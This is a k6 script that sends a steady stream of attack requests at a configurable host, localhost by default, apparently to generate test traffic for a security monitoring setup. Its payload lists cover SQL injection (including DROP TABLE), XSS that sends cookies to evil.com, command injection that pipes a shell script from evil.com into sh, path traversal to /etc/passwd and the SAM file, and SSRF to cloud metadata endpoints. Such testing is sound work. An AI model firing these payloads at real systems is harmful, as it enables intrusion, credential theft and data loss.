import http from 'k6/http';
import { sleep } from 'k6';

const HOST = `http://${__ENV.TARGET_HOST || 'localhost'}:${__ENV.TARGET_PORT || '8080'}`;

const BACKENDS = ['/py', '/node', '/java', '/php'];

function randomBackend() {
    return BACKENDS[Math.floor(Math.random() * BACKENDS.length)];
}

export const options = {
    scenarios: {
        attack_traffic: {
            executor: 'constant-arrival-rate',
            rate: 2,
            timeUnit: '1m',
            duration: '24h',
            preAllocatedVUs: 1,
            maxVUs: 2,
        },
    },
};

// SQL injection payloads
const SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "'; DROP TABLE users;--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--",
    "1 OR 1=1",
    "admin'--",
    "' OR '' = '",
];

// XSS payloads
const XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>document.location="http://evil.com/"+document.cookie</script>',
    "<svg/onload=alert('xss')>",
    'javascript:alert(1)//',
    '<iframe src="javascript:alert(1)">',
];

// Command injection payloads
const CMDI_PAYLOADS = [
    '; ls -la',
    '| cat /etc/passwd',
    '$(whoami)',
    '`id`',
    '; curl http://evil.com/shell.sh | sh',
    '& ping -c 3 evil.com',
];

// Path traversal payloads
const TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..\\..\\..\\windows\\system32\\config\\sam',
];

// SSRF payloads
const SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://127.0.0.1:8126/info',
    'http://localhost:5432/',
    'file:///etc/passwd',
    'http://[::1]:8001/',
];

export default function () {
    const prefix = randomBackend();

    // SQLi in search
    const sqli = SQLI_PAYLOADS[Math.floor(Math.random() * SQLI_PAYLOADS.length)];
    http.get(`${HOST}${prefix}/search?q=${encodeURIComponent(sqli)}`);
    sleep(1);

    // SQLi in login
    http.post(`${HOST}${prefix}/login`, {
        username: SQLI_PAYLOADS[Math.floor(Math.random() * SQLI_PAYLOADS.length)],
        password: SQLI_PAYLOADS[Math.floor(Math.random() * SQLI_PAYLOADS.length)],
    });
    sleep(1);

    // SQLi in product ID
    http.get(`${HOST}${prefix}/product/1 OR 1=1`);
    sleep(0.5);

    // XSS in review
    const xss = XSS_PAYLOADS[Math.floor(Math.random() * XSS_PAYLOADS.length)];
    http.post(`${HOST}${prefix}/review`, {
        product_id: '1',
        username: 'attacker',
        rating: '5',
        body: xss,
    });
    sleep(1);

    // Reflected XSS in profile
    http.get(`${HOST}${prefix}/profile/${encodeURIComponent(XSS_PAYLOADS[0])}`);
    sleep(0.5);

    // Command injection in export
    const cmdi = CMDI_PAYLOADS[Math.floor(Math.random() * CMDI_PAYLOADS.length)];
    http.get(`${HOST}${prefix}/export?file=${encodeURIComponent(cmdi)}`);
    sleep(1);

    // SSRF in webhook
    const ssrf = SSRF_PAYLOADS[Math.floor(Math.random() * SSRF_PAYLOADS.length)];
    http.post(`${HOST}${prefix}/webhook`, JSON.stringify({ url: ssrf }), {
        headers: { 'Content-Type': 'application/json' },
    });
    sleep(1);

    // Path traversal in upload
    const traversal = TRAVERSAL_PAYLOADS[Math.floor(Math.random() * TRAVERSAL_PAYLOADS.length)];
    const fileContent = new Uint8Array([116, 101, 115, 116]).buffer;
    const formData = { filename: traversal, file: http.file(fileContent, 'test.txt') };
    http.post(`${HOST}${prefix}/upload`, formData);
    sleep(1);

    sleep(3);
}
